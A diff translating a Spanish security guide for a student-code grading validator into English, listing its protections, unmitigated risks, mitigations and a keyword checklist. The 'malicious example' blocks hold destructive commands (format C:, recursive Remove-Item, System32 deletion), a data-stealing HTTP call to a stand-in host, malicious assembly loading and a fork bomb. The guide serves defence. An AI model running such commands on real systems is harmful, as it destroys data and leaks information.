@@ -1,71 +1,72 @@
-# Seguridad al Ejecutar Código de Alumnos
 
-## ✅ Protecciones Implementadas
+# Security When Running Student Code
 
-### 1. **Límite de Tiempo (Timeout)**
-- Protege contra: bucles infinitos
-- Límite configurable en la interfaz (default: 5 segundos)
+## ✅ Protections Implemented
 
-### 2. **Límite de Memoria**
-- Protege contra: consumo excesivo de RAM, memory bombs
-- Límite: **512 MB** por proceso
-- Monitoreo cada 100ms durante la ejecución
+### 1. **Timeout Limit**
+- Protects against: infinite loops
+- Configurable limit in the UI (default: 5 seconds)
 
-### 3. **Prioridad Reducida del Proceso**
-- Los procesos ejecutados tienen prioridad `BelowNormal`
-- Minimiza el impacto en el sistema si hay uso intensivo de CPU
+### 2. **Memory Limit**
+- Protects against: excessive RAM usage, memory bombs
+- Limit: **512 MB** per process
+- Monitored every 100ms during execution
 
-### 4. **Directorio de Trabajo Aislado (WorkDir)**
-- Cada ejecución usa un directorio temporal separado
-- Se limpia automáticamente después de ejecutar
-- El código del alumno no puede acceder directamente a archivos del sistema
+### 3. **Reduced Process Priority**
+- Executed processes run with `BelowNormal` priority
+- Minimizes system impact if CPU is heavily used
 
-## ⚠️ Riesgos NO Mitigados (Recomendaciones)
+### 4. **Isolated Working Directory (WorkDir)**
+- Each execution uses a separate temporary directory
+- Automatically cleaned up after execution
+- Student code cannot directly access system files
 
-### 1. **Acceso al Sistema de Archivos**
-**Riesgo:** El código puede leer/escribir/eliminar archivos en cualquier ubicación.
+## ⚠️ Risks NOT Mitigated (Recommendations)
 
-**Ejemplo malicioso:**
+### 1. **File System Access**
+**Risk:** Code can read/write/delete files anywhere on the system.
+
+**Malicious example:**
 ```csharp
-File.Delete("C:\\Windows\\System32\\importante.dll"); // ❌ PELIGROSO
-Directory.Delete("C:\\Users\\Profesor\\Documentos", true); // ❌ PELIGROSO
+File.Delete("C:\\Windows\\System32\\important.dll"); // ❌ DANGEROUS
+Directory.Delete("C:\\Users\\Teacher\\Documents", true); // ❌ DANGEROUS
 ```
 
-**Mitigación sugerida:**
-- Ejecutar en una máquina virtual o contenedor Docker
-- Usar un usuario con permisos limitados
-- Revisar manualmente el código antes de ejecutar
+**Suggested mitigation:**
+- Run in a virtual machine or Docker container
+- Use a user account with limited permissions
+- Manually review code before execution
 
-### 2. **Acceso a Red**
-**Riesgo:** El código puede hacer peticiones HTTP, enviar datos, descargar malware.
+### 2. **Network Access**
+**Risk:** Code can make HTTP requests, send data, download malware.
 
-**Ejemplo malicioso:**
+**Malicious example:**
 ```csharp
 using var client = new HttpClient();
-await client.GetAsync("http://sitio-malicioso.com/robar-datos"); // ❌ PELIGROSO
+await client.GetAsync("http://malicious-site.com/steal-data"); // ❌ DANGEROUS
 ```
 
-**Mitigación sugerida:**
-- Desconectar la red durante las pruebas
-- Usar firewall para bloquear acceso a red del proceso
+**Suggested mitigation:**
+- Disconnect network during tests
+- Use a firewall to block process network access
 
-### 3. **Ejecución de Otros Procesos**
-**Riesgo:** El código puede lanzar otros programas.
+### 3. **Spawning Other Processes**
+**Risk:** Code can launch other programs.
 
-**Ejemplo malicioso:**
+**Malicious example:**
 ```csharp
-Process.Start("cmd.exe", "/c format C: /y"); // ❌ EXTREMADAMENTE PELIGROSO
-Process.Start("powershell", "-Command Remove-Item C:\\* -Recurse"); // ❌ PELIGROSO
+Process.Start("cmd.exe", "/c format C: /y"); // ❌ EXTREMELY DANGEROUS
+Process.Start("powershell", "-Command Remove-Item C:\\* -Recurse"); // ❌ DANGEROUS
 ```
 
-**Mitigación sugerida:**
-- Ejecutar en sandbox o contenedor
-- Revisar el código manualmente antes de ejecutar
+**Suggested mitigation:**
+- Run in a sandbox or container
+- Manually review code before execution
 
 ### 4. **Fork Bombs**
-**Riesgo:** Crear procesos infinitamente hasta colapsar el sistema.
+**Risk:** Create processes infinitely until the system crashes.
 
-**Ejemplo malicioso:**
+**Malicious example:**
 ```csharp
 while(true) 
 {
@@ -73,63 +74,63 @@ while(true)
 }
 ```
 
-**Mitigación:** Parcialmente cubierta por timeout y límite de memoria, pero puede causar problemas antes de que se detecte.
+**Mitigation:** Partially covered by timeout and memory limit, but may cause issues before detection.
 
-### 5. **Reflexión y Código Dinámico**
-**Riesgo:** Usar reflection para ejecutar código arbitrario o acceder a APIs privadas.
+### 5. **Reflection and Dynamic Code**
+**Risk:** Use reflection to execute arbitrary code or access private APIs.
 
-**Ejemplo malicioso:**
+**Malicious example:**
 ```csharp
-Assembly.Load(maliciousBytes); // ❌ Cargar DLL maliciosa
+Assembly.Load(maliciousBytes); // ❌ Load malicious DLL
 Type.GetType("System.Security.SecurityManager").GetMethod("SetSecurity")?.Invoke(...); // ❌
 ```
 
-## 🛡️ Mejores Prácticas Recomendadas
+## 🛡️ Recommended Best Practices
 
-### Opción 1: Máquina Virtual
-- Ejecutar el validador en una VM con snapshot
-- Revertir snapshot después de cada sesión de corrección
-- **Ventaja:** Protección completa
-- **Desventaja:** Requiere más recursos
+### Option 1: Virtual Machine
+- Run the validator in a VM with snapshots
+- Revert snapshot after each grading session
+- **Advantage:** Full protection
+- **Disadvantage:** Requires more resources
 
-### Opción 2: Sandbox con Windows Sandbox
+### Option 2: Windows Sandbox
 ```powershell
-# Ejecutar en Windows Sandbox (Windows 10 Pro/Enterprise)
+# Run in Windows Sandbox (Windows 10 Pro/Enterprise)
 WindowsSandbox.exe
 ```
 
-### Opción 3: Contenedor Docker
+### Option 3: Docker Container
 ```dockerfile
 FROM mcr.microsoft.com/dotnet/sdk:8.0
 WORKDIR /app
-# Configurar límites de recursos
+# Configure resource limits
 ```
 
-### Opción 4: Revisión Manual Previa
-- **Revisar rápidamente** el código antes de ejecutar
-- Buscar: `Process.Start`, `File.Delete`, `HttpClient`, `System.Net`
-- Toma ~30 segundos por alumno
+### Option 4: Manual Code Review
+- **Quickly review** code before execution
+- Look for: `Process.Start`, `File.Delete`, `HttpClient`, `System.Net`
+- Takes ~30 seconds per student
 
-### Opción 5: Usuario con Permisos Limitados
+### Option 5: Limited Permission User
 ```powershell
-# Crear usuario sin privilegios para ejecutar el validador
-net user ValidadorTest password123 /add
-# No agregar a ningún grupo administrativo
+# Create a non-privileged user to run the validator
+net user ValidatorTest password123 /add
+# Do not add to any admin group
 ```
 
-## 📋 Checklist de Seguridad
+## 📋 Security Checklist
 
-Antes de usar en producción:
+Before using in production:
 
-- [ ] ¿Estás ejecutando en una VM o máquina dedicada?
-- [ ] ¿Has revisado el código de los alumnos buscando `Process.Start`, `File.Delete`, `HttpClient`?
-- [ ] ¿Tienes respaldos de archivos importantes?
-- [ ] ¿El validador se ejecuta con un usuario sin privilegios de administrador?
-- [ ] ¿Has probado primero con tu propio código para verificar funcionamiento?
+- [ ] Are you running in a VM or dedicated machine?
+- [ ] Have you reviewed student code for `Process.Start`, `File.Delete`, `HttpClient`?
+- [ ] Do you have backups of important files?
+- [ ] Is the validator running as a non-admin user?
+- [ ] Have you tested with your own code first?
 
-## 🔍 Señales de Código Malicioso
+## 🔍 Signs of Malicious Code
 
-Busca estas palabras clave en el código de alumnos:
+Look for these keywords in student code:
 
 ```
 ❌ Process.Start
@@ -144,14 +145,14 @@ Busca estas palabras clave en el código de alumnos:
 ❌ Reflection
 ```
 
-Si encuentras alguna, **revisa manualmente** antes de ejecutar.
+If you find any, **review manually** before running.
 
-## Conclusión
+## Conclusion
 
-El validador tiene protecciones básicas pero **NO ES UN SANDBOX COMPLETO**. Para uso seguro en producción:
+The validator has basic protections but **IS NOT A COMPLETE SANDBOX**. For safe production use:
 
-1. **Mejor opción:** Ejecutar en VM/Docker
-2. **Opción práctica:** Revisar código + usuario limitado
-3. **Opción mínima:** Tener respaldos + estar preparado para restaurar el sistema
+1. **Best option:** Run in VM/Docker
+2. **Practical option:** Review code + limited user
+3. **Minimal option:** Have backups + be ready to restore the system
 
-**Recuerda:** Ningún sistema es 100% seguro. La combinación de múltiples capas de protección es la mejor estrategia.
+**Remember:** No system is 100% secure. Combining multiple layers of protection is the best strategy.
